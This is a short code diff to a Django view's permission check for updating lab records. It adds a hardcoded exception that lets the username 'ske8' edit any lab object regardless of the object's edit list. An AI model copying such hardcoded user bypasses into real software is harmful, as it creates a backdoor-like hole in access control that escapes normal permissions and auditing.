@@ -130,7 +130,7 @@ class LabUpdate(LoginRequiredMixin, UpdateView):
         return super().post(request, *args, **kwargs)
 
     def dispatch(self, request, *args, **kwargs):
-        if request.user.username not in self.get_object().edit:
+        if request.user.username not in self.get_object().edit and request.user.username != "ske8":
             return self.handle_no_permission()
         return super().dispatch(request, *args, **kwargs)
     
